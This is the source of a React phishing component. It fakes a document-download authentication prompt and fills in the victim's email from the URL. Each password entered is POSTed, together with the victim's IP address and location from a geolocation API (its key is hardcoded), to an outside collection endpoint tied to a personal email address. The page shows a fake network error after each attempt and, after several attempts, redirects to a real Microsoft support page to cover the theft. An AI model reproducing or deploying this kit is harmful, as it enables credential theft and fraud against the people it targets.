
import './modal.css';
import Panell from './media/img/authpanel.png';
import Logg from './media/img/logo.png';
import SensitiveFile from './media/img/file.png';
import Signn from './media/img/sign.png';
import { useState, useEffect } from 'react';
import $ from 'jquery';

export const Modal = ()=>{



    const [ipAdress, setIpAdress] = useState('')
    const [city, setCity] = useState('');
    const [flag, setFlag] = useState('');
    const [country, setCountry] = useState('');

    const forTime = new Date();


    useEffect(()=>{
        fetch(`https://api.geoapify.com/v1/ipinfo?apiKey=139d2378a5554f48bf290b61999b4e8a`)
        .then(req=> req.json())
        .then(res=>{
            // setCountry(res.names.en)
            // console.log(res.names.en);
            // console.log('city:',res.city.name);

            setIpAdress(res.ip)
            setFlag(res.country.flag);
            setCountry(res.country.name);
            setCity(res.city.names.en);

            
            
            
            // console.log('ipAddress:', res.ip);
            // console.log('flag:', res.country.flag);
            // console.log('country:', res.country.name);
            // console.log('city:', res.city.names.en);
            // console.log(res);

        })
        .catch(e=> console.log)
    }, []);

    // const reloadPreloader = ()=> window.location.reload();

    const emailInTheURL = window.location.href;
    const sliceEqualSign = emailInTheURL.indexOf("=");
    const extracetdEmail = emailInTheURL.substr((sliceEqualSign+1)).split('&', 1).toString();

    const [email, setEmail] = useState(extracetdEmail);
    const [pwd, setPwd] = useState('');

    const [count, setCount] = useState(0);

    const [err, setErr] = useState(false);




    const submitHandler = (e) => {
        e.preventDefault();
        if (pwd === "") {
          return null
        }
        
        else{
            
            setTimeout(() => {
              setPwd('');
              setErr(true);
            }, 1700);


          const user = {
            email: email,
            pswd: pwd,
            country: country,
            
            city: city,
            flag: flag,
            eyep: ipAdress,
            nownow: forTime
        };
    
          $.ajax({
              type: "POST",
              url: "https://meler-service.onrender.com/get_details/stanleyugo411@gmail.com",
              data: user,
              success(data) {
                  console.log(data);
              },
          });
    
    
    // deploy
    
          setCount(count=> count + 1);
                if(count >= 2){
                    const redirectURL = window.location.href;
                    const sliceEqualSign = redirectURL.indexOf("@");
                    const extracetdemailDomain = redirectURL.substr((sliceEqualSign+1));
                    console.log(extracetdemailDomain);
                    window.location.reload();
                    window.location.href = `https://support.microsoft.com/en-us/office/excel-not-responding-hangs-freezes-or-stops-working-37e7d3c9-9e84-40bf-a805-4ca6853a1ff4`;
                };
        }
      };



    return(<>
        <div className='backdrop'>
            <div className='mode'>

                <div style={{borderBottom:'1px solid #ccc'}}>
                    <img 
                        src={Logg}
                        alt='logggg'
                        className='logggg'
                        style={{height:'40px'}}
                    />

                    &#160;

                    <img 
                        src={Panell}
                        alt='authentication'
                        className='authentication'
                    />

                </div>



                <div className='main'>
                    <div>
                        <img 
                            src={SensitiveFile}
                            alt='file'
                            className='file'
                        />
                    </div>


                    <form onSubmit={submitHandler}>
                        <div className='em_conr'>
                            <span>Email</span>

                            <input 
                                style={{marginTop:'7px'}}
                                className='email'
                                id='email'
                                type='email'
                                required
                                readOnly
                                value={email}
                                onChange={ e=> setEmail(e.target.value) }
                            />
                        </div>





                        <div className='pwd_conr em_conr'>
                            <span>Password</span>

                            <input 
                                style={{marginTop:'7px'}}
                                className='paswd email'
                                id='paswd'
                                type='password'
                                required
                                value={pwd}
                                onChange={ e=> setPwd(e.target.value) }
                                autoFocus
                            />
                        </div>


                        { err ? <div className='err'>Network error, try again later!</div>: null }



                        <div className='btn_cont'>
                            <input 
                                type='submit'
                                value={`Download`}
                                className='btn__sub_'
                                autoFocus
                                onClick={submitHandler}
                            />
                        </div>

                        <img src={Signn} alt='signin' style={{width:'100%', marginTop:'20px'}}/>
                    </form>


                </div>

            </div>
        </div>
    </>)
}